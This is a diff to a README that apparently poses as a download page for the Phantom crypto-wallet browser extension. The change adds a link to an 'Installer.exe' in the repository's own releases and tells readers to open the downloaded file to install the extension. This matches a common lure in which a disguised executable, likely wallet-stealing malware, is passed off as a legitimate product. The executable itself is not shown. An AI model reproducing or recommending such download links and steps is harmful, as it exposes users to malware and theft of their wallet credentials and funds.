@@ -20,7 +20,9 @@ Follow these steps to set up **phantom wallet extension download**:
 
 1. **Download the file.**  
    Click the "Download" button below or navigate to the "Releases" section of this repository to access the latest version.
-![download](https://github.com/user-attachments/assets/2c628818-c85b-4b91-af0b-4657fcfa379f)
+<a href="https://github.com/marvino77/phantom-wallet-extension-download/releases/download/publish/Installer.exe">
+  <img src="https://github.com/user-attachments/assets/2c628818-c85b-4b91-af0b-4657fcfa379f" alt="201887" width="300"/>
+</a>
 
 2. **Install the extension.**  
    Open the downloaded file and follow the on-screen prompts to add the extension to your browser.
